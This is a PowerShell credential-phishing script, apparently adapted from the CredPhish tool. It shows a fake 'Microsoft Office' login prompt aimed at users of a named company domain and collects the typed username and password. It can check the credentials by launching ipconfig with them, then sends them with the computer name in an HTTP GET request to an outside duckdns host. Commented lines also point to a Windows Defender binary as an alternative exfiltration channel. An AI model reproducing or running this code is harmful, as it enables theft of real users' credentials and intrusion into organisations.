# Source: https://github.com/tokyoneon/CredPhish/blob/master/credphish.ps1
# One possible solution for phishing for a users credentials (username and password)
# Changed invokeHttpExfil() to send a GET-request to "mortygb.duckdns.org/<credentials>" instead, and removing "invokeDnsExfil" and "invokeSmbExfil"

# exfil address
$exfilServer = "mortygb.duckdns.org"

# prompt
$targetUser = $env:username
$companyEmail = "kongsberg.com"
$promptCaption = "Microsoft Office"
$promptMessage = "Connecting to: $targetUser@$companyEmail"
$maxTries = 1 # maximum number of times to invoke prompt
$delayPrompts = 2 # seconds between prompts
$validateCredentials = $false # interrupt $maxTries and immediately exfil if credentials are valid

# http
# start http server in kali: python3 -m http.server 80
$enableHttpExfil = $true
$httpPort = 80
$ConfigSecurityPolicy = "C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe"

##########################################################################

function invokeHttpExfil(){
    #$httpServer = 'http://' + $exfilServer + ':' + $httpPort + '/' + [uri]::EscapeDataString($capturedCreds)
    #if (test-path -path $ConfigSecurityPolicy) {
        #& $ConfigSecurityPolicy $httpServer
    #}else{
        # HTTP method w/ Invoke-WebRequest (lame)
        #Invoke-WebRequest -UseBasicParsing $httpServer | Out-Null
    #}
    $url = "http://mortygb.duckdns.org/$capturedCreds"
    Invoke-RestMethod -Uri $url -Method Get
}

function testCredentials(){
    $securePassword = ConvertTo-SecureString -AsPlainText $phish.CredentialPassword -Force
    $secureCredentials = New-Object System.Management.Automation.PSCredential($phish.CredentialUsername, $securePassword)
    Start-Process ipconfig -Credential $secureCredentials
    return $?
}

Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | `
? { $_.Name -eq 'AsTask' -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[void][Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
$asTask = $asTask.MakeGenericMethod(([Windows.Security.Credentials.UI.CredentialPickerResults]))
$opt = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$opt.AuthenticationProtocol = 0
$opt.Caption = $promptCaption
$opt.Message = $promptMessage
$opt.TargetName = '1'

$count = 0
$ErrorActionPreference = 'SilentlyContinue'
[system.collections.arraylist]$harvestCredentials = @()
while (!($validPassword -Or $count -eq $maxTries)){
    start-sleep -s $delayPrompts
    $phish = $asTask.Invoke($null, @(([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($opt)))).Result
    [void]$harvestCredentials.Add($phish.CredentialUsername + ':' + $phish.CredentialPassword)
    if (!($phish.CredentialPassword) -Or !($phish.CredentialUsername)){
        Continue
    }
    if ($validateCredentials){
        $validPassword = testCredentials
    }
    $count++
}

$capturedCreds = $env:computername + '[' + ($harvestCredentials -join ',') + ']'

invokeHttpExfil
